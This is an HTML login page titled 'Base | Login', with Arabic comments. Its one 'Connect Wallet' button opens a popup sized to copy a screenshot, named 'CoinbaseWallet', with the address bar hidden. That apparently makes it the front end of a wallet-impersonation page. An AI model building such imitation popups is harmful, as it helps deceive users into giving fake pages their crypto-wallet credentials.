<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Base | Login</title>
    <style>
        /* خلفية الصفحة الأساسية اللي بتفتح النافذة */
        body {
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .open-btn {
            padding: 15px 30px;
            background-color: #0052ff;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <button class="open-btn" onclick="openWalletPopup()">Connect Wallet</button>

    <script>
        function openWalletPopup() {
            // مقاسات النافذة اللي في الصورة تقريباً 400 في 600
            const width = 400;
            const height = 650;
            const left = (screen.width / 2) - (width / 2);
            const top = (screen.height / 2) - (height / 2);

            const params = `width=${width},height=${height},top=${top},left=${left},resizable=no,scrollbars=no,status=no,location=no,toolbar=no,menubar=no`;
            
            // استبدل 'wallet.html' باسم ملف الكود تبعك
            window.open('wallet.html', 'CoinbaseWallet', params);
        }
    </script>

</body>
</html>
